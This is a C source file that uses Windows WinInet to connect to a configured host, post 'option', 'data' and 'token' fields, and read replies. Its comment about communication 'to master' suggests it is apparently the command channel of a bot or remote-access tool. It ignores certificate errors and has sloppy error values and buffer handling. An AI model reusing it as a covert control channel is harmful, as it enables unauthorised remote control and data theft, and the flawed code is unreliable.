#include <windows.h>
#include <wininet.h>
#include <strsafe.h>
#include "config.h"
#include "http.h"


HINTERNET hInet = NULL;
HINTERNET hConnect = NULL;

/**
 * @brief Connect via HTTP for comunication to master
 * @returns 0xFFFFFFFF if error
 *          HANDLE to request if success
 */
HINTERNET __http_connect() {
	HINTERNET hRequest = NULL;
	DWORD len=NULL;

	if((hInet=InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0))==NULL) { //INTERNET_FLAG_ASYNC
		return((HINTERNET)0xFFFFFFFF);
	}

	if((hConnect=InternetConnectA(	hInet, 
				  	HOST, 
					PORT, 
					NULL, 
					NULL, 
					INTERNET_SERVICE_HTTP, 
					INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_KEEP_CONNECTION,
					0))==NULL) {
		return((HINTERNET)0xFFFFFFFF);
	}

	if((hRequest=HttpOpenRequestA(hConnect, METHOD, PATH, "HTTP/1.1", NULL, NULL, 
					INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
					INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP  |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
					INTERNET_FLAG_NO_AUTH |
					INTERNET_FLAG_NO_CACHE_WRITE |
					INTERNET_FLAG_NO_UI |
					INTERNET_FLAG_PRAGMA_NOCACHE |
					INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT,
					0))==NULL) {
		return((HINTERNET)0xFFFFFFF);
	}
	
/*	if(HttpSendRequestA(hRequest, NULL, 0, NULL, 0)==FALSE) {
		return(0xFFFFFFFF);		
	}
*/

	return(hRequest);
}


/**
 * @brief Make full post request from 
 * @param original input original encoded string
 * @param original_len length of original string 
 * @param encode output base64 decode string
 * @encoded_len output base64 decode string length
 * @returns 0 if error
 *          1 if encoded success
 */
int __http_make_reply(char *post_data, int post_data_len, char *option, char *data, char *token) {
	if((lstrlenA(option)+lstrlenA(data)+lstrlenA(token))>post_data_len) {
		return(0xFFFFFFFF);
	}

	if(lstrcpynA(post_data, VAR_OPTION, lstrlenA(VAR_OPTION)+1)==NULL) {
		return(0xFFFFFFFF);
	}

	if(lstrcatA(post_data, option)==NULL) {
                return(0xFFFFFFFF);
	}	
		
	if(lstrcatA(post_data, VAR_DATA)==NULL) {
                return(0xFFFFFFFF);
	}

	if(lstrcatA(post_data, data)==NULL) {
                return(0xFFFFFFFF);
	}

	if(lstrcatA(post_data, VAR_TOKEN)==NULL) {
                return(0xFFFFFFFF);
	}
	
	if(lstrcatA(post_data, token)==NULL) {
                return(0xFFFFFFFF);
	}

	if(lstrcatA(post_data, HTTP_RETURN)==NULL) {
		return(0xFFFFFFFF);
	}

	return(lstrlenA(post_data));
	

}

int __http_reply(HINTERNET hRequest, char *post_data, char *reply) {
	int datalen = lstrlenA(post_data);
	DWORD len=NULL;
	DWORD replylen=lstrlenA(reply);

	if(datalen==0) {
		datalen=sizeof(char *);
	}	
	
	if(HttpSendRequestA(hRequest, NULL, datalen, post_data, datalen)==FALSE) {
		return(0xFFFFFFFF);		
	}

	else {
		if(InternetReadFile(hRequest, reply,replylen, &len)==FALSE) {
			return(0xFFFFFFFF);
		}
	}
	
	return(len);
}

int __http_make_contentlength(char *header, unsigned int max_len, unsigned int content_length) {
	StringCbPrintfA(header, max_len, "Content-Length: %d\n\r", content_length); 
	return 0;
}


int __http_read(HINTERNET hRequest, char *reply) {
	DWORD len=NULL;
	DWORD replylen = 20000;
	char *header = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);

	ZeroMemory(header, 1024);

//	__http_make_contentlength(header, 1024, lstrlenA(READ_VARS));

//	HttpAddRequestHeadersA(hRequest, header, lstrlenA(header), HTTP_ADDREQ_FLAG_REPLACE);


	if(HttpSendRequestA(hRequest, NULL, 0, 0,0)==FALSE) {
		HeapFree(GetProcessHeap(),HEAP_NO_SERIALIZE,header);
		return(0xFFFFFFFF);		
	}

	else {
		if(InternetReadFile(hRequest, reply,replylen, &len)==TRUE) {
			HeapFree(GetProcessHeap(),HEAP_NO_SERIALIZE,header);
			return(lstrlenA(reply));
		}
	}
	
	if(header)
		HeapFree(GetProcessHeap(),HEAP_NO_SERIALIZE,header);


	return(len);
}

int __http_close(HINTERNET hRequest) {
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInet);
	return(0);
}

